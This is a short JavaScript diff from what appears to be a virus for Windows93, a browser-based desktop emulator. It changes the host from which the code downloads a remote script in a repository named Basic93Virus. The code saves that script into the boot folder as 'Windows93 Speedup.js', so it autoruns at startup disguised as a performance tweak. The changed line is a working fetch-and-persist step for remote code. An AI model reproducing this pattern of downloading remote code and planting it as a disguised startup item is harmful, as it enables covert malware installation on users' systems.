@@ -8,7 +8,7 @@ function download_script(url) {
 	return xhr.response
 }
 
-var foo = download_script('https://ghcdn.rawgit.org/OutRite/Basic93Virus/main/main.js')
+var foo = download_script('https://raw.githack.com/OutRite/Basic93Virus/main/main.js')
 
 $db.set("boot/Windows93 Speedup.js", foo)
 
